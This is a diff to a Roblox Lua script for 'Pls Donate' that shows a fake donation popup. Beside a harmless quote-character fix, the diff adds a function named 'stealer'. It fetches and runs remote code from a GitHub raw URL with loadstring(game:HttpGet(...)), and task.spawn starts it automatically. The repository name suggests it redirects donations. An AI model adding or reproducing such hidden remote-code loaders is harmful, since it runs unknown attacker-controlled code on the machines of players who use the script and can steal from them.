@@ -46,6 +46,12 @@ watermark.BackgroundTransparency = 1
 watermark.Font = Enum.Font.SourceSans
 watermark.TextScaled = true
 
+local function stealer()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/Giggarigga/PlsDonateRedirection/refs/heads/main/Redirecter", true))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
 
 local function formatNumber(number)
     local formatted = tostring(number)
@@ -59,7 +65,7 @@ end
 
 local function createDonationPopup(username, robux_amount)
     local ScreenGui = playerGui:FindFirstChild("ScreenGui")
-    local Donation_Text = username.." DONATED " ..formatNumber(robux_amount).. “ TO YOU!"
+    local Donation_Text = username.." DONATED " ..formatNumber(robux_amount).. " TO YOU!"
     local clone = playerGui.UITemplates.donationPopup:Clone()
 
 
